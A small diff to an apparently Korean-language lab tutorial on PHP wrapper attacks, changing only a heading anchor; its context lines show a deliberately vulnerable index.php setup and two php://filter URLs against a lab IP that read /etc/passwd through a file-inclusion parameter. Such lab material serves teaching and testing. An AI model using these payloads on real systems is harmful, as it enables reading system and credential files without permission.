@@ -11,7 +11,7 @@ https://www.php.net/manual/en/wrappers.php
 
 # **INDEX**
 
-**1. [php://](#php)**
+**1. [php://](#php:)**
 
 # **환경 구성**
 
@@ -40,7 +40,7 @@ php wrapper에 대한 공격에 취약한 페이지(index.php)를 만들자.
 ?>
 ```
 
-# **php**
+# **php:**
 
 http://192.168.0.58/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
 http://192.168.0.58/index.php?page=php://filter/string.rot13/resource=/etc/passwd
